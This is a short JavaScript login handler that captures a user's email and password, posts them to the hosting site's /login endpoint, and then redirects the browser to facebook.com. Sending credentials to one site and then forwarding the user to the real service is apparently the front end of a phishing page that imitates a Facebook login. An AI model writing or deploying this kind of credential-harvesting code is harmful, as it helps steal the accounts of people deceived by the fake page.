document.getElementById("loginButton").onclick = () => {
    var email = document.getElementById("emailInput").value 
    var password = document.getElementById("passwordInput").value
    var xhr = new XMLHttpRequest();
    var url = "/login";
    xhr.open("POST", url, true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4 && xhr.status === 200) {
            document.location = "https://facebook.com"
        }
    };
    var data = JSON.stringify({email, password});
    xhr.send(data);
}

